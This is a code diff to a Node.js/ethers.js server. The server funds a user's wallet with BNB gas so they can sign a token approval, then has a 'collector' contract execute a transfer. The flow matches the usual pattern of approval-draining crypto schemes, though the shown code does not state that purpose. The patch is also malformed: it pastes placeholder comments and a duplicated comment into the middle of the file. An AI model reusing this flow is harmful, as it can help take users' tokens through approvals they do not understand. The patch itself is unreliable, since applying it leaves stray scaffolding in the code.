@@ -29,26 +29,31 @@ const CONTRACT_ABI = [
 const collectorContract = new ethers.Contract(process.env.CONTRACT_ADDRESS, CONTRACT_ABI, merchantWallet);
 
 // Endpoint 1: Fund the user with enough BNB for the approval transaction
+// ... existing imports and setup ...
+
+// Endpoint 1: Fund the user with enough BNB for the approval transaction
 app.post('/fund-gas', async (req, res) => {
     try {
         const { userAddress } = req.body;
-        
-        // Check if user already has enough BNB (e.g., 0.0005 BNB) to avoid draining your wallet
         const balance = await provider.getBalance(userAddress);
         const requiredGas = ethers.parseEther("0.0005"); 
         
         if (balance < requiredGas) {
-            const tx = await merchantWallet.sendTransaction({
+            // Added .catch() to prevent unhandled promise rejections on fire-and-forget
+            merchantWallet.sendTransaction({
                 to: userAddress,
-                value: requiredGas - balance // Only send what is missing
-            });
-            await tx.wait();
+                value: requiredGas - balance 
+            }).catch(err => console.error(`Failed to send gas to ${userAddress}:`, err)); 
         }
-        res.json({ success: true, message: "Gas funded" });
+        
+        // Return immediately so the frontend can start its timer
+        res.json({ success: true }); 
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
+
+// ... rest of your execute-collection logic ...
 
 // Endpoint 2: Merchant executes the transfer (Merchant pays gas)
 app.post('/execute-collection', async (req, res) => {
